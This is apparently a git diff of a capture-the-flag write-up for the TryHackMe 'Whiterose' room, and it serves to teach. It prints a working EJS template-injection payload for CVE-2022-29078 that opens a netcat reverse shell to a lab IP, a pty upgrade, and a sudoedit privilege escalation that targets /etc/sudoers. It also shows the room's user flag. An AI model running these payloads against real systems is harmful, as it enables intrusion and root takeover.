@@ -1,4 +1,3 @@
-# <div align="center">[Whiterose](https://tryhackme.com/r/room/whiterose)</div>
 <div align="center"> Yet another Mr. Robot themed challenge.</div>
 <div align="center">
   <img src="https://github.com/user-attachments/assets/63573b56-425b-415c-9133-31f9b701470b" height="200"></img>
@@ -116,9 +115,101 @@ Jemmy Laurel: Oh, is she OK?
 </div>
 
 ### At setting tab we can change the password of the users
-
-![image](https://github.com/user-attachments/assets/5f8dcf57-0af6-4716-93be-bfd11e6b19d0)
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/5f8dcf57-0af6-4716-93be-bfd11e6b19d0" height="400"></img>
+</div>
 
 ### After testing the name and password parameters for vulnerabilities such as SQL injection, XSS, and SSTI, we didn't find any issues. Let's intercept this request in Burp Suite to investigate further.
 
+### Origional Request
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/1cc1f3e7-0f8c-4bc3-b62c-3650c3b635a5" height="400"></img>
+</div>
 
+## When I remove the password parameter, I encounter the following error:
+
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/fbb5933d-ee74-4ae1-b866-fa03203e745b" height="600></img>
+</div>
+
+
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/a49fbb78-a1d7-499c-950a-228535b5bc15" height="400"></img>
+</div>
+
+## Upon closely examining I discovered that EJS Server-side template injection, which could potentially lead to RCE (Remote Code Execution) and We get the shell here.
+## Only a limited number of options can typically be passed with the data. However, the CVE-2022-29078 vulnerability allows us to bypass this restriction. By using the ```settings['view options']``` parameter, we can pass any option without limitation.
+
+## Capture the request and edit it and send:
+```
+name=a&password=a&&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.17.120.99 1337 -e bash');s
+```
+![image](https://github.com/user-attachments/assets/a9297f49-9ccb-46ad-a179-3dd7921101bf)
+
+## Open Nc to get reverse connection.
+```
+nc -lnvp 1337
+```
+
+![image](https://github.com/user-attachments/assets/938b362a-2a54-4f9b-bafe-d8e6ac638597)
+
+## We got our connection let import shell:
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+```
+# nc -lnvp 1337
+Listening on 0.0.0.0 1337
+Connection received on 10.10.113.127 42640
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+web@cyprusbank:~/app$
+```
+## User Flag
+```
+cat /home/web/user.txt
+```
+<!--```
+THM{4lways_upd4te_uR_d3p3nd3nc!3s}
+```-->
+```
+THM{4lw_____!3s}
+```
+# Privilege Escalation
+```
+web@cyprusbank:~$ sudo -l
+sudo -l
+Matching Defaults entries for web on cyprusbank:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User web may run the following commands on cyprusbank:
+    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+web@cyprusbank:~$
+```
+### We see that we can run ```sudoedit``` as root without a password for this file ```/etc/nginx/sites-available/admin.cyprusbank.thm```
+
+### Let open this in Editor
+```
+export EDITOR="nano -- /etc/sudoers"
+```
+```
+sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div align="center">
+  <img src="" height="400"></img>
+</div>
